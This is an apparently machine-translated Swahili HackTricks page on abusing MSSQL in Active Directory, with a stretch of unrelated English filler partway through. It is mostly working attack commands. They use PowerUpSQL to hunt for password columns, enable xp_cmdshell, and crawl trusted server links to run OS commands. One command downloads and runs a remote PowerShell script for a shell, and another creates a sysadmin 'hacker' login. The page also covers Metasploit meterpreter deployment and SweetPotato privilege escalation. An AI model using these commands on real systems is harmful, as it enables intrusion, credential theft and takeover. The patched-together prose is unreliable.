# Matumizi Mabaya ya MSSQL AD

<details>

<summary><strong>Jifunze kuhusu kuhack AWS kutoka mwanzo hadi kuwa bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikionekana katika HackTricks**? Au ungependa kupata ufikiaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa muundo wa PDF**? Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **nifuatilie** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwenye [repo ya hacktricks](https://github.com/carlospolop/hacktricks) na [repo ya hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## **Uthibitishaji / Ugunduzi wa MSSQL**

Moduli ya powershell [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) ni muhimu sana katika kesi hii.
```powershell
Import-Module .\PowerupSQL.psd1
```
### Kuchunguza kutoka kwenye mtandao bila kikao cha kikoa

Kuna njia kadhaa za kuchunguza mazingira ya Active Directory (AD) kutoka kwenye mtandao bila kuwa na kikao cha kikoa. Hapa kuna mbinu kadhaa unazoweza kutumia:

1. **DNS Enumeration**: Tumia zana kama `nslookup` au `dig` kutafuta habari kuhusu seva za DNS za kikoa. Unaweza kupata majina ya kikoa, anwani za IP, na habari nyingine muhimu.

2. **Port Scanning**: Tumia zana kama `nmap` kutambua seva zinazofanya kazi na huduma zinazopatikana kwenye mtandao wa kikoa. Hii inaweza kukupa habari kuhusu seva za SQL Server (MSSQL) zinazotumika na AD.

3. **Service Enumeration**: Tumia zana kama `enum4linux` au `ldapsearch` kutafuta habari kuhusu huduma zinazopatikana kwenye mtandao wa kikoa. Unaweza kupata habari kuhusu watumiaji, vikundi, na vitu vingine vya AD.

4. **Password Spraying**: Jaribu kutumia mbinu ya "password spraying" kwa kutumia zana kama `Hydra` au `Burp Suite` ili kujaribu nywila rahisi kwa watumiaji wa AD. Hii inaweza kukupa ufikiaji wa akaunti za AD.

5. **Web Application Vulnerability Scanning**: Tumia zana kama `Nikto` au `OWASP ZAP` kutafuta udhaifu kwenye programu za wavuti zinazotumiwa na AD. Udhaifu huu unaweza kukupa ufikiaji wa mazingira ya AD.

Kwa kutumia mbinu hizi, unaweza kuchunguza mazingira ya AD kutoka kwenye mtandao bila kuwa na kikao cha kikoa. Hii inaweza kukusaidia kupata habari muhimu na kugundua udhaifu ambao unaweza kutumika kwa faida yako.
```powershell
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#If you don't have a AD account, you can try to find MSSQL scanning via UDP
#First, you will need a list of hosts to scan
Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads 10

#If you have some valid credentials and you have discovered valid MSSQL hosts you can try to login into them
#The discovered MSSQL servers must be on the file: C:\temp\instances.txt
Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
```
### Kuchunguza kutoka ndani ya kikoa

Kuchunguza kutoka ndani ya kikoa ni mbinu ya kuchunguza na kuchunguza mazingira ya Active Directory (AD) kutoka ndani ya mtandao wa kikoa. Hii inaruhusu mtu kugundua habari muhimu kuhusu miundombinu ya AD na kutafuta njia za kuvunja usalama.

Kuna njia kadhaa za kufanya uchunguzi kutoka ndani ya kikoa, ikiwa ni pamoja na:

1. **Kuchunguza Huduma za DNS**: Kuchunguza huduma za DNS inaweza kutoa habari muhimu kuhusu miundombinu ya AD, kama vile majina ya seva za AD na majina ya kikoa.

2. **Kuchunguza Huduma za LDAP**: Kuchunguza huduma za LDAP inaweza kutoa habari kuhusu miundombinu ya AD, kama vile majina ya seva za AD, majina ya kikoa, na habari ya kuingia.

3. **Kuchunguza Huduma za Kerberos**: Kuchunguza huduma za Kerberos inaweza kutoa habari kuhusu miundombinu ya AD, kama vile majina ya seva za AD, majina ya kikoa, na habari ya kuingia.

4. **Kuchunguza Huduma za SMB**: Kuchunguza huduma za SMB inaweza kutoa habari kuhusu miundombinu ya AD, kama vile majina ya seva za AD, majina ya kikoa, na habari ya kuingia.

5. **Kuchunguza Huduma za SQL**: Kuchunguza huduma za SQL inaweza kutoa habari kuhusu miundombinu ya AD, kama vile majina ya seva za AD, majina ya kikoa, na habari ya kuingia.

Kwa kuchunguza na kuchunguza mazingira ya AD kutoka ndani ya kikoa, mtu anaweza kupata habari muhimu ambayo inaweza kutumiwa kwa njia mbalimbali, kama vile kuvunja usalama, kutekeleza mashambulizi ya kudhibiti, au kufanya uchunguzi wa kina zaidi.
```powershell
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#Get info about valid MSQL instances running in domain
#This looks for SPNs that starts with MSSQL (not always is a MSSQL running instance)
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose

#Test connections with each one
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose

#Try to connect and obtain info from each MSSQL server (also useful to check conectivity)
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

# Get DBs, test connections and get info in oneliner
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
```
To access an MSSQL database, you can use the following methods:

1. **SQL Server Management Studio (SSMS):** This is a graphical tool provided by Microsoft to manage MSSQL databases. You can connect to the database server using SSMS and access the database.

2. **Command Line Tools:** MSSQL provides command line tools such as `sqlcmd` and `osql` that allow you to execute SQL queries and commands directly from the command prompt.

3. **Programming Languages:** You can use programming languages like Python, Java, or C# to connect to the MSSQL database and perform operations using libraries or frameworks such as pyodbc, JDBC, or ADO.NET.

### Exploiting Weak Credentials

If you have weak or default credentials for an MSSQL database, you can exploit them to gain unauthorized access. Here are some techniques you can use:

1. **Brute-Force Attacks:** Use tools like Hydra or Medusa to perform brute-force attacks against the MSSQL server, trying different username and password combinations until you find a valid one.

2. **Password Spraying:** Instead of trying multiple passwords for a single user, try a single password against multiple user accounts. This technique is effective when organizations use weak passwords across multiple accounts.

3. **Credential Stuffing:** Use a list of known usernames and passwords obtained from data breaches to try and gain access to the MSSQL server. Many users reuse passwords across multiple accounts, so this technique can be successful.

### Exploiting SQL Injection Vulnerabilities

If the MSSQL database is vulnerable to SQL injection, you can exploit this vulnerability to gain unauthorized access or perform other malicious actions. Here's how:

1. **Identify SQL Injection Points:** Look for user input fields or parameters in the application that are directly used in SQL queries without proper sanitization or parameterization.

2. **Craft Malicious SQL Queries:** Inject SQL statements that manipulate the query logic to bypass authentication, retrieve sensitive information, or modify the database.

3. **Union-Based SQL Injection:** Use the UNION operator to combine the results of a malicious query with a legitimate query, allowing you to extract data from the database.

4. **Time-Based Blind SQL Injection:** Exploit time delays in the database's response to infer information about the database structure or retrieve data.

### Exploiting Misconfigurations

Misconfigurations in the MSSQL server can provide opportunities for unauthorized access. Here are some common misconfigurations to look for:

1. **Weak or Default Passwords:** Many administrators fail to change the default passwords or use weak passwords, making it easier for attackers to gain access.

2. **Unrestricted User Privileges:** Ensure that user accounts have the minimum required privileges. Avoid granting unnecessary administrative privileges to prevent unauthorized access.

3. **Unpatched Vulnerabilities:** Keep the MSSQL server up to date with the latest security patches to prevent exploitation of known vulnerabilities.

4. **Exposed Database Ports:** Ensure that the MSSQL server is not exposed directly to the internet. Use firewalls or network segmentation to restrict access to the database.

By exploiting these weaknesses, you can gain unauthorized access to an MSSQL database and perform various malicious activities. It is important to note that hacking into systems without proper authorization is illegal and unethical. Always ensure you have proper authorization and follow ethical guidelines when performing security assessments or penetration testing.
```powershell
#Perform a SQL query
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"

#Dump an instance (a lotof CVSs generated in current dir)
Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"

# Search keywords in columns trying to access the MSSQL DBs
## This won't use trusted SQL links
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "password" -SampleSize 5 | select instance, database, column, sample | ft -autosize
```
### MSSQL RCE

Inawezekana pia kutekeleza amri ndani ya mwenyeji wa MSSQL
```powershell
Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
# Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
```
Angalia katika ukurasa uliotajwa katika **sehemu ifuatayo jinsi ya kufanya hivi kwa mkono.**

### Mbinu za Msingi za Kudukua MSSQL

{% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
[pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
{% endcontent-ref %}

## Viungo Vya Kuaminika vya MSSQL

Ikiwa kifaa cha MSSQL kinaaminiwa (kiunga cha database) na kifaa kingine cha MSSQL. Ikiwa mtumiaji ana mamlaka juu ya database iliyoaminiwa, ataweza **kutumia uhusiano wa kuaminika kutekeleza maswali pia kwenye kifaa kingine**. Viungo hivi vinaweza kuunganishwa na kwa wakati fulani mtumiaji anaweza kupata database iliyopangwa vibaya ambapo anaweza kutekeleza amri.

**Viungo kati ya databases hufanya kazi hata kwenye uaminifu wa misitu.**

### Matumizi ya Powershell
```powershell
#Look for MSSQL links of an accessible instance
Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0

#Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose

#If you are sysadmin in some trusted link you can enable xp_cmdshell with:
Get-SQLServerLinkCrawl -instance "<INSTANCE1>" -verbose -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "<INSTANCE2>"'

#Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query "exec master..xp_cmdshell 'whoami'"

#Obtain a shell
Get-SQLServerLinkCrawl -Instance dcorp-mssql  -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1'')"'

#Check for possible vulnerabilities on an instance where you have access
Invoke-SQLAudit -Verbose -Instance "dcorp-mssql.dollarcorp.moneycorp.local"

#Try to escalate privileges on an instance
Invoke-SQLEscalatePriv –Verbose –Instance "SQLServer1\Instance1"

#Manual trusted link queery
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select * from openquery(""sql2.domain.io"", 'select * from information_schema.tables')"
## Enable xp_cmdshell and check it
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'SELECT * FROM OPENQUERY("sql2.domain.io", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT [sql.rto.external]'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT [sql.rto.external]'
## If you see the results of @@selectname, it worked
Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql.rto.external", ''select @@servername; exec xp_cmdshell ''''powershell whoami'''''');'
```
### Metasploit

Unaweza kwa urahisi kuchunguza viungo vya kuaminika kwa kutumia metasploit.
```bash
#Set username, password, windows auth (if using AD), IP...
msf> use exploit/windows/mssql/mssql_linkcrawler
[msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
```
Tambua kuwa metasploit itajaribu kutumia tu kazi ya `openquery()` katika MSSQL (kwa hivyo, ikiwa huwezi kutekeleza amri na `openquery()` utahitaji kujaribu njia ya `EXECUTE` **kwa mkono** ili kutekeleza amri, angalia zaidi hapa chini.)

### Kwa Mkono - Openquery()

Kutoka **Linux** unaweza kupata kikao cha kudhibiti cha MSSQL na **sqsh** na **mssqlclient.py.**

Kutoka **Windows** unaweza pia kupata viungo na kutekeleza amri kwa mkono kwa kutumia **mteja wa MSSQL kama** [**HeidiSQL**](https://www.heidisql.com)

_Ingia kwa kutumia uwakala wa Windows:_

![](<../../.gitbook/assets/image (167) (1).png>)

#### Tafuta Viungo Vinavyoweza Kuaminika
```sql
select * from master..sysservers
```
![](<../../.gitbook/assets/image (168).png>)

#### Tekeleza maswali katika kiungo kinachoweza kuaminika

Tekeleza maswali kupitia kiungo (mfano: tafuta viungo zaidi katika kifaa kipya kinachoweza kufikiwa):
```sql
select * from openquery("dcorp-sql1", 'select * from master..sysservers')
```
{% hint style="warning" %}
Angalia wapi alama za nukta mbili na nukta moja zinatumika, ni muhimu kuzitumia kwa njia hiyo.
{% endhint %}

![](<../../.gitbook/assets/image (169).png>)

Unaweza kuendeleza mnyororo huu wa viungo vya kuaminika milele kwa mkono.
```sql
# First level RCE
SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')

# Second level RCE
SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
```
Ikiwa huwezi kutekeleza vitendo kama `exec xp_cmdshell` kutoka `openquery()`, jaribu na njia ya `EXECUTE`.

### Mwongozo - EXECUTE

Unaweza pia kutumia vituo vya kuaminika kwa kudanganya kwa kutumia njia ya `EXECUTE`:
```bash
#Create user and give admin privileges
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
```
## Kupandisha Uthibitisho wa Mamlaka wa Ndani

**Mtumiaji wa ndani wa MSSQL** kawaida ana aina maalum ya mamlaka inayoitwa **`SeImpersonatePrivilege`**. Hii inaruhusu akaunti kujifanya kuwa mteja baada ya uthibitisho.

Stratejia ambayo waandishi wengi wamebuni ni kulazimisha huduma ya SYSTEM kuthibitisha kwa huduma ya udanganyifu au mtu katikati ambayo mshambuliaji anajenga. Huduma hii ya udanganyifu inaweza kujifanya kuwa huduma ya SYSTEM wakati inajaribu kuthibitisha.

[SweetPotato](https://github.com/CCob/SweetPotato) ina mkusanyiko wa mbinu hizi mbalimbali ambazo zinaweza kutekelezwa kupitia amri ya `execute-assembly` ya Beacon.

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikionekana katika HackTricks**? Au ungependa kupata ufikiaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au **kikundi cha telegram**](https://t.me/peass) au **nifuate** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa [repo ya hacktricks](https://github.com/carlospolop/hacktricks) na [repo ya hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
